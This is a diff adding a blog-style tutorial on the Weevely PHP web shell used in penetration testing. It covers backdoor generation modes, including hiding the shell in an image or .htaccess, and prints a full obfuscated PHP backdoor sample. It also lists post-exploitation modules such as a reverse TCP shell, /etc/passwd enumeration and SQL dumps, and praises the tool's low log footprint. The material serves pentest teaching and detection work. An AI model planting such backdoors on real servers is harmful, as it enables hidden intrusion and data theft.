@@ -1,0 +1,193 @@
+<p>Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test. 
+By default in Kali Linux, the installed version 1.1 isn’t supported anymore but version 3 is available on <a href="https://github.com/epinna/weevely3" title="Weevely on GitHub" class="flashlink" target="_blank">GitHub</a>.</p>
+
+<p>Generate the backdoor:</p>
+
+<p><code class="highlighter-rouge">weevely generate.&lt;mode&gt; &lt;password&gt; &lt;path&gt;</code></p>
+
+<p>The password is optionnal but it’s important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.</p>
+
+<ul>
+  <li><strong>htaccess</strong>: a single <code class="highlighter-rouge">.htaccess</code> file is created containing the malicious code and the right Apache directive so that all <code class="highlighter-rouge">.htaccess</code> files are considered as regular PHP script</li>
+  <li><strong>img</strong>: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an <code class="highlighter-rouge">.htaccess</code> 
+to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)</li>
+  <li><strong>php</strong>: this is the default, a single PHP script is generated</li>
+</ul>
+
+<!--more-->
+
+<p>Example:</p>
+
+<p><a href="/images/weevely-generate.png"><img src="/images/weevely-generate.png" alt="Weevely generate" /></a></p>
+
+<p>A <code class="highlighter-rouge">sessions</code> directory has also been created to log every command. 
+No matter what creation mode you choosed the obfuscated generated PHP code looks like this:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$ztqi</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"h"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">"hshtrh_rhehphlhahche"</span><span class="p">);</span>
+<span class="nv">$hule</span><span class="o">=</span><span class="s2">"am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ=="</span><span class="p">;</span>
+<span class="nv">$xhmv</span><span class="o">=</span><span class="s2">"PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ"</span><span class="p">;</span>
+<span class="nv">$ezko</span><span class="o">=</span><span class="s2">"ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg"</span><span class="p">;</span>
+<span class="nv">$kyjf</span><span class="o">=</span><span class="s2">"JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr"</span><span class="p">;</span>
+<span class="nv">$tjbu</span> <span class="o">=</span> <span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"g"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">"basgeg6g4g_gdgegcgode"</span><span class="p">);</span>
+<span class="nv">$plri</span> <span class="o">=</span> <span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"y"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">"cyreyatye_yfuynycytyiyon"</span><span class="p">);</span>
+<span class="nv">$pigj</span> <span class="o">=</span> <span class="nv">$plri</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$tjbu</span><span class="p">(</span><span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"hr"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$kyjf</span><span class="o">.</span><span class="nv">$xhmv</span><span class="o">.</span><span class="nv">$ezko</span><span class="o">.</span><span class="nv">$hule</span><span class="p">)));</span> <span class="nv">$pigj</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on… 
+Once you have infected your target, you can connect to the client with the password you choosed:</p>
+
+<p><a href="/images/weevely-connect.png"><img src="/images/weevely-connect.png" alt="Weevely connect" /></a></p>
+
+<p>Running <code class="highlighter-rouge">:help </code>will display the list of all modules available or the detailed usage informations of the given module.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>:audit.systemfiles</td>
+      <td>Find wrong system files permissions</td>
+    </tr>
+    <tr>
+      <td>:audit.phpconf</td>
+      <td>Check php security configurations</td>
+    </tr>
+    <tr>
+      <td>:audit.mapwebfiles</td>
+      <td>Crawl and enumerate web folders files permissions</td>
+    </tr>
+    <tr>
+      <td>:audit.userfiles</td>
+      <td>Guess files with wrong permissions in users home folders</td>
+    </tr>
+    <tr>
+      <td>:audit.etcpasswd</td>
+      <td>Enumerate users and /etc/passwd content</td>
+    </tr>
+    <tr>
+      <td>:shell.sh</td>
+      <td>Execute system shell command</td>
+    </tr>
+    <tr>
+      <td>:shell.php</td>
+      <td>Execute PHP statement</td>
+    </tr>
+    <tr>
+      <td>:system.info</td>
+      <td>Collect system informations</td>
+    </tr>
+    <tr>
+      <td>:backdoor.reversetcp</td>
+      <td>Send reverse TCP shell</td>
+    </tr>
+    <tr>
+      <td>:backdoor.tcp</td>
+      <td>Open a shell on TCP port</td>
+    </tr>
+    <tr>
+      <td>:bruteforce.sqlusers</td>
+      <td>Bruteforce all SQL users</td>
+    </tr>
+    <tr>
+      <td>:bruteforce.sql</td>
+      <td>Bruteforce SQL username</td>
+    </tr>
+    <tr>
+      <td>:file.edit</td>
+      <td>Edit remote file</td>
+    </tr>
+    <tr>
+      <td>:file.mount</td>
+      <td>Mount remote filesystem using HTTPfs</td>
+    </tr>
+    <tr>
+      <td>:file.webdownload</td>
+      <td>Download web URL to remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.touch</td>
+      <td>Change file timestamps</td>
+    </tr>
+    <tr>
+      <td>:file.upload2web</td>
+      <td>Upload binary/ascii file into remote web folders and guess corresponding url</td>
+    </tr>
+    <tr>
+      <td>:file.download</td>
+      <td>Download binary/ascii files from the remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.enum</td>
+      <td>Enumerate remote paths</td>
+    </tr>
+    <tr>
+      <td>:file.read</td>
+      <td>Read remote file</td>
+    </tr>
+    <tr>
+      <td>:file.upload</td>
+      <td>Upload binary/ascii file into remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.check</td>
+      <td>Check remote files type, md5 and permission</td>
+    </tr>
+    <tr>
+      <td>:file.rm</td>
+      <td>Remove remote files and folders</td>
+    </tr>
+    <tr>
+      <td>:file.ls</td>
+      <td>List directory contents</td>
+    </tr>
+    <tr>
+      <td>:sql.console</td>
+      <td>Run SQL console or execute single queries</td>
+    </tr>
+    <tr>
+      <td>:sql.dump</td>
+      <td>Get SQL database dump</td>
+    </tr>
+    <tr>
+      <td>:net.phpproxy</td>
+      <td>Install remote PHP proxy</td>
+    </tr>
+    <tr>
+      <td>:net.ifaces</td>
+      <td>Print interfaces addresses</td>
+    </tr>
+    <tr>
+      <td>:net.scan</td>
+      <td>Port scan open TCP ports</td>
+    </tr>
+    <tr>
+      <td>:net.proxy</td>
+      <td>Install and run Proxy to tunnel traffic through target</td>
+    </tr>
+    <tr>
+      <td>:find.suidsgid</td>
+      <td>Find files with superuser flags</td>
+    </tr>
+    <tr>
+      <td>:find.name</td>
+      <td>Find files with matching name</td>
+    </tr>
+    <tr>
+      <td>:find.perms</td>
+      <td>Find files with write, read, execute permissions</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Another good point for Weevely is the verbosity, the remote agent is very low footprint. Below my Apache logs after running some commands:</p>
+
+<p><a href="/images/weevely-traces.png"><img src="/images/weevely-traces.png" alt="Weevely traces" /></a></p>
+
+<p>As you may notice the user-agent has also been randomized wich is usually a good idea…</p>
